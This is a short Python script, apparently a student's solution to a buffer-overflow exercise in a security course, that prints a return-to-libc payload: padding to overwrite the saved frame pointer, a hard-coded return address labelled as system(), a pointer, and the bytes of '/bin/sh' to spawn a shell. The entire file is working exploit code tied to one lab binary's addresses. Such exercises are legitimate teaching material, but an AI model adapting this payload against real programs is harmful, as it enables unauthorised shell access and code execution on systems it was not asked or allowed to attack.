#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"a" * 14)  # 10 bytes for char[], 4 bytes for ebp
sys.stdout.buffer.write(pack("<I", 0x080488ad))  # ret = system()
sys.stdout.buffer.write(pack("<I", 0xfffeb314))  # char* ptr = "/bin/sh"
sys.stdout.buffer.write(pack("<I", 0x6e69622f) + pack("<I", 0x68732f00))  # "/bin/sh"
